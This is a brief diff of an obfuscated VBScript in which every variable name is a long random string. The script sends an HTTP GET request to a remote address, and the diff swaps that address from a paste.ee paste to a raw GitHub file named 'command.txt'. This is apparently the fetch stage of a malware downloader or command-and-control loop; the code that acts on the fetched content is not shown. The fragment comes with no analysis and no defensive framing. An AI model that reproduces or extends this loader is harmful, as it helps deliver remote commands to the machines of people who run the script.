@@ -1,4 +1,4 @@
-miOrEKvWqwEhHwIUZLXrYLNKFfTjkvASMQRvgHgVdCvNBywkmO = "https://paste.ee/d/uuVa6"
+miOrEKvWqwEhHwIUZLXrYLNKFfTjkvASMQRvgHgVdCvNBywkmO = "https://raw.githubusercontent.com/freelancertool/data/master/command.txt"
 Set RdvUqpANVIFRYhgsapYSkIcuPIBcHvXlEkPJnUafyFfQQYGcWQ = CreateObject("MSXML2.ServerXMLHTTP")
 RdvUqpANVIFRYhgsapYSkIcuPIBcHvXlEkPJnUafyFfQQYGcWQ.Open "GET", miOrEKvWqwEhHwIUZLXrYLNKFfTjkvASMQRvgHgVdCvNBywkmO, False
 RdvUqpANVIFRYhgsapYSkIcuPIBcHvXlEkPJnUafyFfQQYGcWQ.Send
